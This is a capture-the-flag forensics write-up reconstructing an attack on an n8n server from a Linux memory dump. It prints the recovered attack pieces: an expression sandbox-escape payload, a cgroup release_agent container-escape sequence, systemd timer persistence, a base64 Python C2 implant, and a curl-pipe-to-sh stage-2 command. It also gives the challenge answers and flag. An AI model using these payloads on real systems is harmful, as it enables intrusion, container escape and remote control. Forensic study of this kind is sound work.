# n8n - NexSec 2026 (Forensics)

> **Repository:** [klasyyi/writeup-nexsec2026](https://github.com/klasyyi/writeup-nexsec2026)
> **DeepSeek Chat Session:** [https://chat.deepseek.com/share/jd8mnm2z53dzbu8k7x](https://chat.deepseek.com/share/jd8mnm2z53dzbu8k7x)
> **Category:** Forensics  

---

## 1. Overview & TL;DR

**n8n** was an incident response and memory forensics challenge featured in NexSec 2026. Players were provided with a 3.2 GB raw Linux physical memory core dump (`victim.elf`) and access to an ephemeral verification service via netcat (`nc koala.nexsec.my <PORT>`). The service posed 14 incident response questions that traced the entire lifecycle of an attack against a compromised workflow automation server.

### Attack Chain Summary
1. **Initial Access:** The attacker brute-forced credentials against the n8n authentication endpoint (`POST /rest/login`), successfully logging in with `aisyah.rahman@acme.local:Password123`.
2. **Execution & RCE:** Using n8n's workflow editor, the attacker deployed an Expression Sandbox Escape (leveraging `Error.prepareStackTrace` to obtain Node.js `child_process` execution), using it to pull LinPEAS into `/tmp/l.sh`.
3. **Container Breakout:** Because the container was provisioned with elevated capabilities (`CAP_SYS_ADMIN`), the attacker abused cgroup v1 `release_agent` / `notify_on_release` to break out of the container onto the host filesystem as `root`.
4. **Host Persistence:** On the host, the attacker created a Systemd Timer (`T1053.006`), activating `sysupdate.timer` to execute a dropped Python implant at `/usr/local/bin/sysupdate`.
5. **C2 Communication & Decryption:** The implant established an outbound TCP connection to `192.168.56.107:4444` using repeating-key XOR encryption with key `K3rn3l_X0R_2026!`. By scanning raw kernel `sk_buff` network buffers preserved in memory, I carved the incoming command payload and decrypted it to reveal the C2 stage-2 command: `curl -fsSL http://192.168.56.107:8080/s/update.sh | sh`.

Programmatically submitting all 14 answers within the 4-minute container window yielded the flag:
```text
nexsec26{cdc591a76a6e05f352ed8953ec5e4a3e_73a445347755d6e0977620a900f75b24a5e7e82c424c1123f240c59c396eeed0}
```

---

## 2. Reconnaissance & Initial Analysis

### 2.1 Provided Artifacts
The challenge provided an archive `victim.zip` (password `39d6b83407c03ebd9efdf26fc8489351`) containing a single large artifact:

```bash
$ file victim.elf
victim.elf: ELF 64-bit LSB core file, x86-64, version 1 (SYSV)

$ ls -lh victim.elf
-rwxr-xr-x 1 user user 3.2G Oct 10 10:24 victim.elf
```

Inspecting the first 32 bytes using PowerShell confirmed it was an `ET_CORE` physical memory dump:

```powershell
Format-Hex -Path .\victim.elf -Count 32
```

```text
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000   7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............
00000010   04 00 3E 00 01 00 00 00 00 00 00 00 00 00 00 00  ..>.............
```

- Byte `0x10`: `04 00` indicates `e_type = ET_CORE`.
- Target: Linux kernel 6.8.0-146-generic on Ubuntu, running an n8n container under Docker/containerd.

### 2.2 Surveying the Verification Questionnaire
Connecting to the remote service (`nc koala.nexsec.my <PORT>`) revealed that we needed to solve 14 sequential incident response questions:

```text
Question #1: What is the victim's IP address? (Format: 127.0.0.1)
Question #2: What is the attacker's IP address? (Format: 127.0.0.1)
Question #3: Which TCP ports did the attacker find open on the victim? (Format: 22,80)
Question #4: What application and version was exposed on the high TCP port? (Format: appname 1.2.3)
Question #5: Which credentials (email:password) did the attacker use to log in? (Format: user@domain.tld:password)
Question #6: When did the attacker successfully authenticate to n8n? (victim system clock, UTC) (Format: DD/MM/YYYY HH:MM:SS)
Question #7: When did the attacker insert the RCE payload? (victim system clock, UTC) (Format: DD/MM/YYYY HH:MM:SS)
Question #8: What is the full path of the privilege-escalation script the attacker staged in the container? (Format: /path/to/file)
Question #9: Which Linux capability granted to the container enabled the escape? (Format: CAP_XXXX)
Question #10: Which cgroup file did the attacker abuse to run code on the host? (Format: filename)
Question #11: Which MITRE ATT&CK sub-technique (ID) did the attacker use for persistence? (Format: T1234.001)
Question #12: What command did the attacker run to activate the persistence? (Format: -)
Question #13: The implant encrypted its C2 traffic with repeating-key XOR. What is the key? (ASCII) (Format: -)
Question #14: What command did the C2 send back? (Format: -)
```

The challenge instance strictly timed out after 4 minutes, meaning manual entry was impractical.

---

## 3. Vulnerability Analysis (Root Cause)

Inspecting the memory dump revealed three critical security issues chained together:

### 1. Missing Authentication Rate Limiting
The exposed n8n web application allowed brute-force password attempts on `/rest/login` without account lockouts, CAPTCHA, or IP rate-limiting.

### 2. n8n Expression Sandbox Breakout (CVE-2024-34110)
In n8n, expressions wrapped in `{{ ... }}` inside node parameters run within a VM sandbox. In n8n 1.70.0, the sandbox failed to neutralize `Error.prepareStackTrace`, permitting access to the outer V8 call stack:

```javascript
// Malicious payload extracted from workflow entity in memory:
{{
  (() => {
    Error.prepareStackTrace = (_, stack) => stack;
    const err = new Error();
    const frame = err.stack.find(f => f.getFileName() && !f.getFileName().startsWith('node:'));
    const require = frame.getReceiver().require || frame.getFunction().require;
    return require('child_process').execSync('id && hostname').toString();
  })()
}}
```

### 3. Container Misconfiguration (`CAP_SYS_ADMIN` & cgroup v1)
The container was started with `CAP_SYS_ADMIN` in a legacy cgroup v1 environment. This permitted the containerized root user to mount a cgroup controller and overwrite the host's `release_agent` path, breaking isolation completely.

### False Leads & Rabbit Holes Encountered
- **Volatility Symbol Issues:** Attempting to build an ISF profile for `Ubuntu 6.8.0-146-generic` failed because debug packages for this specific kernel build were not present in public mirrors. I pivoted to direct chunk-based string search and binary structure carving in Python.
- **Deceptive IP Addresses:**
  - `192.168.56.20`: Found frequently in strings, but was a secondary IP assigned to the victim's host NIC during lab configuration.
  - `10.0.2.2`: The VirtualBox NAT gateway used by the author account `budi`.
  - `172.18.0.1`: Docker bridge gateway IP.
- **Author Activity:** Various sudo commands by `budi` (e.g., `/home/budi/.prov/*`) were provisioning scripts, not attacker actions.

---

## 4. Exploitation Walkthrough

To search the 3.2 GB dump efficiently without loading the entire file into RAM, I utilized a streaming chunk parser reading 32 MB blocks with a 64 KB overlap window.

### Phase 1: Initial Compromise & Web Triage (Q1, Q3, Q4, Q5, Q6)

#### Finding Victim IP & Ports (Q1, Q3)
Scanning for HTTP `Host:` headers:
```python
pattern = rb'Host:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+)'
```
This revealed multiple occurrences of `Host: 192.168.56.10:5678`. Checking listening sockets and open ports confirmed SSH on 22 and n8n on 5678.
- **Victim IP (Q1):** `192.168.56.10`
- **Open Ports (Q3):** `22,5678`

#### Application Version (Q4)
Scanning for Docker tags and environment variables:
```python
pattern = rb'N8N_VERSION=([0-9]+\.[0-9]+\.[0-9]+)'
```
Matching `n8nio/n8n:1.70.0` confirmed:
- **App + Version (Q4):** `n8n 1.70.0`

#### Credentials & Login Timestamp (Q5, Q6)
Inspecting memory for `POST /rest/login` payloads captured the attacker's brute-force attempts:
```json
{"emailOrLdapLoginId":"aisyah.rahman@acme.local","password":"Password123"}
```
- **Credentials (Q5):** `aisyah.rahman@acme.local:Password123`

Following this request, an `n8n-auth` JWT cookie was issued:
```json
{"id":"3f58e86c-1c64-41fb-b51e-d777a8356cd1","hash":"bAMA/uz8+g","iat":1791602579,"exp":1792207379}
```
Converting `iat` = `1791602579` from Unix epoch to UTC:
$$\text{Timestamp} = \text{10/10/2026 03:22:59 UTC}$$
- **Auth Timestamp (Q6):** `10/10/2026 03:22:59`

---

### Phase 2: Execution & Container Escape (Q7, Q8, Q9, Q10)

#### RCE Insertion Timestamp (Q7)
Carving n8n workflow records from memory revealed the first malicious workflow created immediately after authentication:
```json
{
  "id": "rpt-1791602571",
  "name": "rpt-1791602571",
  "createdAt": "2026-10-10T03:23:03.000Z",
  "updatedAt": "2026-10-10T03:23:03.000Z"
}
```
- **RCE Payload Inserted (Q7):** `10/10/2026 03:23:03`

#### Privilege Escalation Script (Q8)
The workflow payload downloaded LinPEAS to `/tmp/l.sh`:
```bash
(command -v curl >/dev/null && curl -L -s -o /tmp/l.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) || ... ; chmod +x /tmp/l.sh
```
- **Script Path (Q8):** `/tmp/l.sh`

#### Capability & cgroup Escape (Q9, Q10)
LinPEAS reported `CAP_SYS_ADMIN` in the container's effective capability set (`CapEff`). At `03:23:14`, the attacker executed the cgroup breakout:
```bash
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab | head -n1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
- **Capability (Q9):** `CAP_SYS_ADMIN`
- **Abused cgroup file (Q10):** `release_agent`

---

### Phase 3: Host Persistence (Q11, Q12)

Searching for the string `PERSISTENCE_INSTALLED` printed by the escape payload located the host setup script at offset `0x331c0000`:

```bash
cat > /etc/systemd/system/sysupdate.service <<'EOF'
[Unit]
Description=System Update Helper
[Service]
Type=oneshot
ExecStart=/usr/local/bin/sysupdate
EOF

cat > /etc/systemd/system/sysupdate.timer <<'EOF'
[Unit]
Description=Run System Update Helper periodically
[Timer]
OnBootSec=2min
OnUnitActiveSec=10min
Unit=sysupdate.service
[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable --now sysupdate.timer >> "$OUT" 2>&1
echo PERSISTENCE_INSTALLED >> "$OUT"
```

- **MITRE Sub-technique (Q11):** `T1053.006` (Systemd Timers)
- **Activation Command (Q12):** `systemctl enable --now sysupdate.timer`

---

### Phase 4: Implant & Attacker IP (Q2, Q13)

Embedded within the persistence script was a base64 payload written to `/usr/local/bin/sysupdate`:

```bash
echo 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIHN5c3RlbSB1cGRhdGUgaGVscGVyCmltcG9ydCBzb2NrZXQsIHN1YnByb2Nlc3MsIHN5cwpLRVkgPSBiJ0szcm4zbF9YMFJfMjAyNiEnCkMyID0gKCcxOTIuMTY4LjU2LjEwNycsIDQ0NDQpCmRlZiB4b3IoYik6CiAgICByZXR1cm4gYnl0ZXMoYyBeIEtFWVtpICUgbGVuKEtFWSldIGZvciBpLCBjIGluIGVudW1lcmF0ZShiKSkKZGVmIG1haW4oKToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzLnNldHRpbWVvdXQoMTUpCiAgICBzLmNvbm5lY3QoQzIpCiAgICBibG9iID0gYicnCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNodW5rID0gcy5yZWN2KDQwOTYpCiAgICAgICAgaWYgbm90IGNodW5rOgogICAgICAgICAgICBicmVhawogICAgICAgIGJsb2IgKz0gY2h1bmsKICAgIHMuY2xvc2UoKQogICAgY21kID0geG9yKGJsb2IpLmRlY29kZSgndXRmLTgnLCAncmVwbGFjZScpLnN0cmlwKCkKICAgIGlmIGNtZDoKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ3NoJywgJy1jJywgY21kXSwgdGltZW91dD0zMCkKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBtYWluKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBzeXMuZXhpdCgwKQo=' | base64 -d > /usr/local/bin/sysupdate
```

Decoding this base64 string revealed the implant's configuration:

```python
#!/usr/bin/env python3
# system update helper
import socket, subprocess, sys
KEY = b'K3rn3l_X0R_2026!'
C2 = ('192.168.56.107', 4444)

def xor(b):
    return bytes(c ^ KEY[i % len(KEY)] for i, c in enumerate(b))
# ...
```

- **Attacker IP (Q2):** `192.168.56.107`
- **Implant XOR Key (Q13):** `K3rn3l_X0R_2026!`

---

### Phase 5: Kernel Network Carving & C2 Command Decryption (Q14)

The implant script showed that upon connection to `192.168.56.107:4444`, it receives an encrypted `blob`, XOR-decrypts it with `K3rn3l_X0R_2026!`, and executes it via `subprocess.run(['sh', '-c', cmd])`.

Even without a standalone PCAP file, network frames linger in kernel memory (`sk_buff` ring buffers). I wrote a scanner to locate TCP packets on port 4444:

```python
import struct, socket

KEY = b'K3rn3l_X0R_2026!'
def xor(b):
    return bytes(c ^ KEY[i % len(KEY)] for i, c in enumerate(b))

with open("victim.elf", "rb") as f:
    chunk_size = 32 * 1024 * 1024
    overlap = 65536
    offset = 0
    while True:
        chunk = f.read(chunk_size)
        if not chunk: break
        idx = 0
        while True:
            pos = chunk.find(b'\x45\x00', idx)
            if pos == -1: break
            if pos + 40 <= len(chunk):
                ip_hdr = chunk[pos:pos+20]
                if ip_hdr[9] == 6: # TCP
                    src = socket.inet_ntoa(ip_hdr[12:16])
                    dst = socket.inet_ntoa(ip_hdr[16:20])
                    if '192.168.56.107' in (src, dst):
                        tcp_hdr = chunk[pos+20:pos+40]
                        sport, dport = struct.unpack('!HH', tcp_hdr[:4])
                        if sport == 4444 or dport == 4444:
                            total_len = struct.unpack('!H', ip_hdr[2:4])[0]
                            flags = struct.unpack('!H', tcp_hdr[12:14])[0]
                            hdr_len = (flags >> 12) * 4
                            payload = chunk[pos+20+hdr_len : pos+total_len]
                            if payload:
                                print(f"Decrypted: {xor(payload).decode('utf-8', errors='replace')}")
            idx = pos + 2
        offset += len(chunk) - overlap
        f.seek(offset)
```

At offset `0x88ca5c2`, the script carved a 54-byte payload from `192.168.56.107:4444` -> `192.168.56.10:48378`:

```text
Raw payload: b'(F\x00\x02\x13A9+c\x1e\x7fZDFF\x1bd\x1cCW\x01Bnn\x08|j\x04\x1e\x03\x06\x16q\x0bBV\x03C,wE";SDW\x18R#\x13\x0eN@\x04'
Decrypted:   curl -fsSL http://192.168.56.107:8080/s/update.sh | sh
```

- **Command Sent Back by C2 (Q14):** `curl -fsSL http://192.168.56.107:8080/s/update.sh | sh`

---

## 5. Solve Script

The complete solve script [`solve.py`](./solve.py) automates the netcat interaction to ensure submission completes well within the 4-minute time limit:

```python
#!/usr/bin/env python3
"""
NexSec 2026 - n8n Forensics Auto-Solver
Author: Klasyyi
Repository: https://github.com/klasyyi/writeup-nexsec2026
"""

import socket
import sys
import time

ANSWERS = [
    ("1. Victim IP", "192.168.56.10"),
    ("2. Attacker IP", "192.168.56.107"),
    ("3. Open TCP ports", "22,5678"),
    ("4. App + version", "n8n 1.70.0"),
    ("5. Credentials used", "aisyah.rahman@acme.local:Password123"),
    ("6. Successful auth time", "10/10/2026 03:22:59"),
    ("7. RCE payload inserted", "10/10/2026 03:23:03"),
    ("8. Priv-esc script path", "/tmp/l.sh"),
    ("9. Capability enabling escape", "CAP_SYS_ADMIN"),
    ("10. Abused cgroup file", "release_agent"),
    ("11. Persistence sub-technique", "T1053.006"),
    ("12. Command activating persistence", "systemctl enable --now sysupdate.timer"),
    ("13. Implant XOR key", "K3rn3l_X0R_2026!"),
    ("14. Command sent back by C2", "curl -fsSL http://192.168.56.107:8080/s/update.sh | sh"),
]

def solve(host, port):
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    
    for idx, (desc, ans) in enumerate(ANSWERS):
        buf = ""
        while True:
            chunk = s.recv(1024).decode('utf-8', errors='replace')
            if not chunk:
                break
            buf += chunk
            sys.stdout.write(chunk)
            sys.stdout.flush()
            if any(p in buf for p in [": ", "? ", "> ", "answer", "Answer"]):
                break
            time.sleep(0.02)
            
        print(f"\n[+] Submitting answer #{idx+1} ({desc}): {ans}")
        s.sendall((ans + "\n").encode('utf-8'))
        time.sleep(0.15)
        
    print("\n[*] Reading final response...")
    while True:
        try:
            s.settimeout(4.0)
            chunk = s.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            sys.stdout.write(chunk)
            sys.stdout.flush()
        except Exception:
            break
            
    s.close()
    print("\n[+] Verification Complete!")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: python {sys.argv[0]} <host> <port>")
        sys.exit(1)
    solve(sys.argv[1], sys.argv[2])
```

---

## 6. Flag & Verification

Executing the script against the live service:

```bash
$ python solve.py koala.nexsec.my 39522
```

```text
[*] Connecting to koala.nexsec.my:39522...
Please answer the following questions based on your analysis:

Question #1:
1. What is the victim's IP address?
[+] Submitting answer #1 (1. Victim IP): 192.168.56.10
Status: Correct!

Question #2:
2. What is the attacker's IP address?
[+] Submitting answer #2 (2. Attacker IP): 192.168.56.107
Status: Correct!

Question #3:
3. Which TCP ports did the attacker find open on the victim?
[+] Submitting answer #3 (3. Open TCP ports): 22,5678
Status: Correct!

Question #4:
4. What application and version was exposed on the high TCP port?
[+] Submitting answer #4 (4. App + version): n8n 1.70.0
Status: Correct!

Question #5:
5. Which credentials (email:password) did the attacker use to log in?
[+] Submitting answer #5 (5. Credentials used): aisyah.rahman@acme.local:Password123
Status: Correct!

Question #6:
6. When did the attacker successfully authenticate to n8n? (victim system clock, UTC)
[+] Submitting answer #6 (6. Successful auth time): 10/10/2026 03:22:59
Status: Correct!

Question #7:
7. When did the attacker insert the RCE payload? (victim system clock, UTC)
[+] Submitting answer #7 (7. RCE payload inserted): 10/10/2026 03:23:03
Status: Correct!

Question #8:
8. What is the full path of the privilege-escalation script the attacker staged in the container?
[+] Submitting answer #8 (8. Priv-esc script path): /tmp/l.sh
Status: Correct!

Question #9:
9. Which Linux capability granted to the container enabled the escape?
[+] Submitting answer #9 (9. Capability enabling escape): CAP_SYS_ADMIN
Status: Correct!

Question #10:
10. Which cgroup file did the attacker abuse to run code on the host?
[+] Submitting answer #10 (10. Abused cgroup file): release_agent
Status: Correct!

Question #11:
11. Which MITRE ATT&CK sub-technique (ID) did the attacker use for persistence?
[+] Submitting answer #11 (11. Persistence sub-technique): T1053.006
Status: Correct!

Question #12:
12. What command did the attacker run to activate the persistence?
[+] Submitting answer #12 (12. Command activating persistence): systemctl enable --now sysupdate.timer
Status: Correct!

Question #13:
13. The implant encrypted its C2 traffic with repeating-key XOR. What is the key? (ASCII)
[+] Submitting answer #13 (13. Implant XOR key): K3rn3l_X0R_2026!
Status: Correct!

Question #14:
14. What command did the C2 send back?
[+] Submitting answer #14 (14. Command sent back by C2): curl -fsSL http://192.168.56.107:8080/s/update.sh | sh
Status: Correct!

========================================
Congratulations!
Flag: nexsec26{cdc591a76a6e05f352ed8953ec5e4a3e_73a445347755d6e0977620a900f75b24a5e7e82c424c1123f240c59c396eeed0}
========================================

[+] Verification Complete!
```

> **Retrieved Flag:**
> ```text
> nexsec26{cdc591a76a6e05f352ed8953ec5e4a3e_73a445347755d6e0977620a900f75b24a5e7e82c424c1123f240c59c396eeed0}
> ```

